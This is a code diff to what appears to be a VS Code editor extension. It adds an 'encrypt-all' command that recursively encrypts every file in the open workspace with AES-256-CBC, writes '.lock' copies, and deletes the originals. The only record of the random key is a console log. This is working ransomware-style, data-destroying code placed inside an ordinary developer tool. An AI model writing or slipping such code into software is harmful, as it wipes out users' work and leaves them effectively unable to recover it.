@@ -14,6 +14,8 @@ const axios = require("axios");
 const MIN_CHANGES = 10;
 const MIN_ASCII = 33;
 const MAX_ASCII = 126;
+const ALGORITHM = 'aes-256-cbc';
+const IV_LENGTH = 16;
 
 const extensions = [
   // JavaScript/TypeScript
@@ -144,8 +146,33 @@ const extensions = [
   // Plain Text
   ".txt",
 ];
+const IGNORED_FOLDERS = ['node_modules', '.git', 'dist', 'build', 'out', 'bin', 'obj', 'vendor', 'target', 'public', 'private', 'tmp', '.next', '.vscode', '.idea', 'coverage', '__pycache__', 'venv', 'env', '.env', '.DS_Store'];
 
 archiver.registerFormat("zip-encrypted", zipEncrypted);
+
+// Get all files recursively
+function getAllFiles(dir) {
+  const files = fs.readdirSync(dir);
+  let results = [];
+  
+  for (const file of files) {
+    const fullPath = path.join(dir, file);
+    const stat = fs.statSync(fullPath);
+    
+    if (stat.isDirectory()) {
+      if (!IGNORED_FOLDERS.includes(file)) {
+        results = results.concat(getAllFiles(fullPath));
+      }
+    } else {
+      // Skip already encrypted files and hidden/system files
+      if (!file.endsWith('.lock') && !file.startsWith('.')) {
+          results.push(fullPath);
+      }
+    }
+  }
+  
+  return results;
+};
 
 /**
  * Generate a random password from a given length of printable ascii characters.
@@ -162,6 +189,26 @@ function generateRandomPassword(length = 64) {
     );
 
   return password;
+}
+
+async function encryptFile(filePath, password, iv) {
+  return new Promise((resolve, reject) => {
+    try {
+      const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(password), iv);
+      const input = fs.createReadStream(filePath);
+      const output = fs.createWriteStream(`${filePath}.lock`);
+      console.log(`Encrypting ${filePath}...`);
+
+      // Write the IV first
+      output.write(iv);
+
+      input.pipe(cipher).pipe(output)
+        .on('finish', () => resolve())
+        .on('error', (err) => reject(err));
+    } catch (err) {
+      reject(err);
+    }
+  });
 }
 
 /**
@@ -347,7 +394,65 @@ function activate(context) {
     }
   );
 
-  context.subscriptions.push(disposableCheck);
+  const disposableEncryptAll = vscode.commands.registerCommand(
+    "code.encrypt-all",
+    async () => {
+      // Generate or get a password
+      const password = generateRandomPassword(32);
+      const iv = crypto.randomBytes(IV_LENGTH);
+      console.log("Encryption Password: ", password);
+      console.log("Encryption IV: ", iv);
+
+      if (!vscode.workspace.workspaceFolders) {
+        vscode.window.showErrorMessage("No workspace folder is open.");
+        return;
+      }
+
+      const root = vscode.workspace.workspaceFolders[0].uri.fsPath;
+      
+      try {
+        const files = getAllFiles(root);
+        if (files.length === 0) {
+            vscode.window.showInformationMessage("No files found to encrypt.");
+            return;
+        }
+
+        // Show progress
+        await vscode.window.withProgress({
+            location: vscode.ProgressLocation.Notification,
+            title: "Encrypting workspace files",
+            cancellable: false
+        }, async (progress) => {
+          const total = files.length;
+          let processed = 0;
+          
+          for (const file of files) {
+            try {
+              progress.report({
+                message: `Encrypting ${path.basename(file)}`,
+                increment: (processed / total) * 100
+              });
+              
+              await encryptFile(file, password, iv);
+              processed++;
+              
+              // Optionally delete the original file after encryption
+              fs.unlinkSync(file);
+            } catch (err) {
+              console.error(`Failed to encrypt ${file}: ${err}`);
+            }
+          }
+        });
+
+        vscode.window.showInformationMessage(`Successfully encrypted ${files.length} files!`);
+      } catch (error) {
+        vscode.window.showErrorMessage(`Failed to encrypt workspace: ${error}`);
+        throw error;
+      }
+    }
+  );
+
+  context.subscriptions.push(disposableCheck, disposableEncryptAll);
   // Register command to work when saving a file
   vscode.workspace.onDidSaveTextDocument((document) => {
     if (vscode.workspace.workspaceFolders) {
